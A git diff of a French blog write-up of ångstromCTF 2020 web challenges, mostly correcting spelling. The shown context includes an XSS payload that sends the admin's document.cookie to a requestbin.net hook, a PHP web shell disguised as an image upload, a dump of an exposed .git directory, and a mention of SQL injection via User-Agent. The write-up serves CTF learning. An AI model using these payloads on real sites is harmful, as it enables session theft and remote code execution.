@@ -1,5 +1,5 @@
 ---
-title: Angstrom CTF 2020
+title: ångstromCTF 2020
 excerpt: Solutions des challenges web du Angstrom CTF 2020
 tags: [CTF, Angstrom, writeup, web]
 categories: Write-ups
@@ -30,7 +30,7 @@ On inspecte l'élément, on change la valeur de contenu dans la balise avec l'id
 ## Xmas Still Stands
 > **DESCRIPTION**: You remember when I said I dropped clam's tables? Well that was on Xmas day. And because I ruined his Xmas, he created the [Anti Xmas Warriors](https://xmas.2020.chall.actf.co/) to try to ruin everybody's Xmas. Despite his best efforts, Xmas Still Stands. But, he did manage to get a flag and put it on his site. Can you get it?
 
-Nous sommes redirigé vers un site visant à détruire Noël! Le site est composé de **4** onglets:
+Nous sommes redirigés vers un site visant à détruire Noël! Le site est composé de **4** onglets:
 * **Home** -> Un simple message expliquant l'intérêt du site
 * **Post** -> Une zone de texte permettant de donner des idées sur comment ruiner Noël
 * **Report** -> Ici, nous pouvons renseigner l'ID d'un post à un administrateur afin qu'il aille en vérifier son contenu
@@ -41,9 +41,9 @@ Tout de suite, je pense à une XSS où il va falloir voler le cookie de l'admini
 ![Challenge](/img/angstrom_2020_xmas_xss.png){: .center-image}
 Sans surprise, l'alert apparaît.
 
-Pour récupérer le cookie, il va falloir un hook sur lequel effectuer une requête contenant le cookie de l'administrateur. Pour cela, j'ai utiliser [requestbin](http://requestbin.net/).  
+Pour récupérer le cookie, il va falloir un hook sur lequel effectuer une requête contenant le cookie de l'administrateur. Pour cela, j'ai utilisé [requestbin](http://requestbin.net/).  
 Le payload est triviale : `<img src=x onerror="this.src='http://requestbin.net/r/xxxxxxxx/?'+document.cookie; this.removeAttribute('onerror');">`.  
-Une fois le post envoyé, on récupère son ID et on la renseigne dans l'onglet **Report** afin qu'un administrateur vienne jeter un oeil à notre post. On attend quelques secondes et une requête est effectué sur notre hook, avec dans l'URL, le **nom** et la **valeur** du cookie.  
+Une fois le post envoyé, on récupère son ID et on la renseigne dans l'onglet **Report** afin qu'un administrateur vienne jeter un œil à notre post. On attend quelques secondes et une requête est effectuée sur notre hook, avec dans l'URL, le **nom** et la **valeur** du cookie.  
 
 ![Challenge](/img/angstrom_2020_xmas_get.png){: .center-image}
 
@@ -59,12 +59,12 @@ Flag `actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds}`
 
 Sur ce challenge, on arrive sur une page avec un bouton et un compteur de $. Lorsque l'on clique sur le bouton, le compteur est incrémenté de 25$. Lorsque j'ai inspecté la page, j'ai vu l'existence d'un script [iftenmillionfireflies.js](https://consolation.2020.chall.actf.co/iftenmillionfireflies.js) qui est totalement obfusqué.
 ![Challenge](/img/angstrom_2020_consolation.png){: .center-image}
-J'ai d'abord cru qu'il fallais déobfusquer le script afin de comprendre son fonctionnement. Grâce à ça j'ai découvert beaucoup de choses, mais qui au final était juste là pour brouiller les pistes!
+J'ai d'abord cru qu'il fallait "déobfusquer" le script afin de comprendre son fonctionnement. Grâce à ça, j'ai découvert beaucoup de choses, mais qui au final était juste là pour brouiller les pistes!
 
-Lorsque je faisais des tests dans la console afin de vérifier le contenu de certains variables, j'ai cliqué sur le bouton et la console s'est effacé! C'est à ce moment là que j'ai compris qu'il fallais creuser comprendre pourquoi clear la console à chaque clique sur le bouton. En faisant une recherche du mot clé `clear` dans le script JS obfusqué, j'ai trouvé cette instruction, qui est la cause du clear de la console lors d'un clique sur le bouton.
+Lorsque je faisais des tests dans la console afin de vérifier le contenu de certaines variables, j'ai cliqué sur le bouton et la console s'est effacé! C'est à ce moment-là que j'ai compris qu'il fallait creuser comprendre pourquoi clear la console à chaque clique sur le bouton. En faisant une recherche du mot-clé `clear` dans le script JS obfusqué, j'ai trouvé cette instruction, qui est la cause du clear de la console lors d'un clique sur le bouton.
 ![Challenge](/img/angstrom_2020_consolation_clear.png){: .center-image}
 
-J'ai télécharger le script JS et la page HTML en local et j'ai supprimé l'instruction `console['clear']();`, j'ai cliqué sur le bouton et TA-DA!  
+J'ai téléchargé le script JS et la page HTML en local et j'ai supprimé l'instruction `console['clear']();`, j'ai cliqué sur le bouton et TA-DA!  
 
 ![Challenge](/img/angstrom_2020_consolation_flag.png){: .center-image}
 
@@ -73,7 +73,7 @@ Flag `actf{you_would_n0t_beli3ve_your_eyes}`
 ## Git Good
 > **DESCRIPTION**: Did you know that angstrom has a git repo for all the challenges? I noticed that clam committed [a very work in progress challenge](https://gitgood.2020.chall.actf.co/) so I thought it was worth sharing.
 
-On arrive sur une page statique avec le message "Hello, world!" affiché. En effectuant des recherches classiques '/robots.txt', '/.git', etc. Je n'ai rien trouvé d'intéressant, j'ai également essayer de lister les répertoires avec `gobuster`, sans succès non plus. J'ai fini par essayer l'outil [dirsearch](https://github.com/maurosoria/dirsearch) qui a eu plus de succès !
+On arrive sur une page statique avec le message "Hello, world!" affiché. En effectuant des recherches classiques '/robots.txt', '/.git', etc. Je n'ai rien trouvé d'intéressant, j'ai également essayé de lister les répertoires avec `gobuster`, sans succès non plus. J'ai fini par essayer l'outil [dirsearch](https://github.com/maurosoria/dirsearch) qui a eu plus de succès !
 ```
 $ python dirsearch.py -u https://gitgood.2020.chall.actf.co -e * -b
 [21:55:29] 200 -   15B  - /.git/COMMIT_EDITMSG
@@ -90,8 +90,8 @@ $ python dirsearch.py -u https://gitgood.2020.chall.actf.co -e * -b
 [21:55:29] 200 -   41B  - /.git/refs/heads/master
 ```
 Finalement, nous n'avons pas accès au répertoire '.git' mais il est possible d'avoir accès à tous les fichiers contenu dans ce répertoire.  
-Le script n'a pas trouvé tous les fichiers car il manque le répertoire 'objects' caractéristiques de la structure du répertoire '.git'.  
-Pour extraire l'ensemble des fichiers contenu dans le répertoire '.git', j'au utiliser l'outil `gitdumper`:
+Le script n'a pas trouvé tous les fichiers, car il manque le répertoire 'objects' caractéristiques de la structure du répertoire '.git'.  
+Pour extraire l'ensemble des fichiers contenu dans le répertoire '.git', j'ai utiliser l'outil `gitdumper`:
 ```
 $ bash gitdumper.sh https://gitgood.2020.chall.actf.co/.git/ clone
 ###########
@@ -147,14 +147,14 @@ Changes not staged for commit:
 	deleted:    package.json
 	deleted:    thisistheflag.txt
 ```
-Maintenant que le repo est en local, il est possible d'intéragir avec les commandes git classiques.  
+Maintenant que le repo est en local, il est possible d'interagir avec les commandes git classiques.  
 On remarque le fichier supprimé 'thisistheflag.txt', avec la commande `git checkout --` on restaure le fichier pour le lire. 
 ```
 $ git checkout -- thisistheflag.txt
 $ cat thisistheflag.txt
 There used to be a flag here...
 ```
-On comprend donc qu'il faut remonter à un commit précédent pour lire le flag précédement renseigné.
+On comprend donc qu'il faut remonter à un commit antérieur pour lire le flag précédemment renseigné.
 Avec `git log`, on énumère tous les commits de la branche master. Et on trouve un seul commit avant celui actuel:
 ```
 $ git log
@@ -186,7 +186,7 @@ Flag: `actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}`
 >
 >Our insider leaked [the source](https://files.actf.co/b8ec533304b09d0100428d372d8392ba4f798bded442038e045334266d758b29/app.py), but was "terminated" shortly thereafter...
 
-On nous fournis les sources du site, et on repère assez facilement qu'une injection SQL est possible à partir du champs **User-Agent**.
+On nous fournit les sources du site, et on repère assez facilement qu'une injection SQL est possible à partir du champ **User-Agent**.
 ```python
 from flask import Flask, render_template, request
 
@@ -248,7 +248,7 @@ Flag `actf{nyoom_1_4m_sp33d}`
 > **DESCRIPTION**: One year since defund's descent. One crypt. One void to fill. Clam must do it, [and so must you](https://crypt.2020.chall.actf.co/).
 
 On est redirigé vers une page nous proposant d'upload une image.  
-Lorsque j'ai inspecté la page, il est indiqué que les source du la page se situe sur **/src** et que la flag est contenu dans le fichier **/flag.txt** sur le filesystem.
+Lorsque j'ai inspecté la page, il est indiqué que les sources de la page se situe sur **/src** et que la flag est contenu dans le fichier **/flag.txt** sur le filesystem.
 ```html
 <!-- Defund was a big fan of open source so head over to /src.php -->
 <!-- Also I have a flag in the filesystem at /flag.txt but too bad you can't read it -->
@@ -354,8 +354,8 @@ Le code source de la page d'accueil est ci-dessous:
     </body>
 </html>
 ```
-En gros, lors d'un upload de fichier, il check si c'est un fichier de type .png, .jpg ou .bmp avec la fonction `finfo_file` de PHP. Il check également que l'extension du fichier correspond bien au type retourné par la fonction `finfo_file`. A partir de là, on suppose qu'il va falloir injecté un script PHP camouflé dans une image, car la fonction `finfo_file` va vérifier le header du fichier pour déterminer son type.
-Pour cela, j'ai simplement pris une image qui trainais dans mes fichiers, j'ai supprimer tout le contenu afin de ne garder que le header, et j'ai ensuite écris mon script PHP ci-dessous:
+En gros, lors d'un upload de fichier, il check si c'est un fichier de type .png, .jpg ou .bmp avec la fonction `finfo_file` de PHP. Il check également que l'extension du fichier correspond bien au type retourné par la fonction `finfo_file`. À partir de là, on suppose qu'il va falloir injecté un script PHP camouflé dans une image, car la fonction `finfo_file` va vérifier le header du fichier pour déterminer son type.
+Pour cela, j'ai simplement pris une image qui traînais dans mes fichiers, j'ai supprimé tout le contenu afin de ne garder que le header, et j'ai ensuite renseigné le script PHP ci-dessous:
 ```php
 <?php
     echo system($_GET['command']);
@@ -375,7 +375,7 @@ FLAG: `actf{th3_ch4ll3ng3_h4s_f4ll3n_but_th3_crypt_rem4ins}`
 Dans ce challenge, on doit réussir à marquer plus de 20 points sur le jeu. Le but étant de parvenir à trouver le cercle au milieu d'un amas de carré le plus de fois possible dans un temps imparti.  
 
 ![Challenge](/img/angstrom_2020_woosh.png){: .center-image}
-Le javascript étant obfusqué, les sources nous sont fournis dans l'énoncé du challenge.
+Le Javascript étant obfusqué, les sources nous sont fournis dans l'énoncé du challenge.
 ```javascript
 const express = require("express");
 const exphbs = require("express-handlebars");
@@ -506,7 +506,7 @@ serv.listen(port, function() {
 });
 ```
 Dans un premier temps, on remarque qu'il s'agit d'un serveur [socket.io](https://socket.io). Je suppose déjà qu'il va falloir implémenter un client afin de simuler le comportement attendu (à savoir cliquer sur le cercle).  
-Le fonctionnement d'un serveur `socket.io` est assez simple. Il attendu qu'un client se connecte avec `io.on("connection", client => {` pour commencer une session. Ensuite, il va attendre des messages du client pour effectuer certains actions (avec les `client.on(<action>)`) et il peut également envoyer des messages au client avec `client.emit(<action>, <valeur>)`.  
+Le fonctionnement d'un serveur `socket.io` est assez simple. Il attendu qu'un client se connecte avec `io.on("connection", client => {` pour commencer une session. Ensuite, il va attendre des messages du client pour effectuer certaines actions (avec les `client.on(<action>)`) et il peut également envoyer des messages au client avec `client.emit(<action>, <valeur>)`.  
 
 Lorsqu'un utilisateur va cliquer sur le bouton **Start game** la page web, le socket client va envoyer l'action `start` au serveur. Lors de la réception de ce message, le serveur vérifie si un partie est déjà en cours auquel il demande au client d'afficher le message `Game already started.`. Sinon, il instancie une partie en générant un tableau de formes puis en initialisant le score à 0. Pour finir, il va envoyer toutes ces informations au client pour qu'il affiche les formes et le score.
 
@@ -538,4 +538,4 @@ ioClient.on("score", (msg) => console.info("Score: ", msg))
 ioClient.on("disp", (msg) => console.info("Disp", msg))
 ```
 
-Je oublié de prendre un screenshot et de noté le flag lorsque j'ai lancé le script car comme les serveur sont stiués au US, et que je suis basé en EU, le temps de latence est impressionnant et j'ai seulement le temps de marquer 4 points, alors que sur l'instance européenne déployée par les admins du Angstrom j'ai pu marquer plus de 30 points et donc d'avoir le flag.
+Je oublié de prendre un screenshot et de noter le flag lorsque j'ai lancé le script, car comme les serveur sont situés au US, et que je suis basé en EU, le temps de latence est impressionnant et j'ai seulement le temps de marquer 4 points, alors que sur l'instance européenne déployée par les admins du Angstrom j'ai pu marquer plus de 30 points et donc d'avoir le flag.
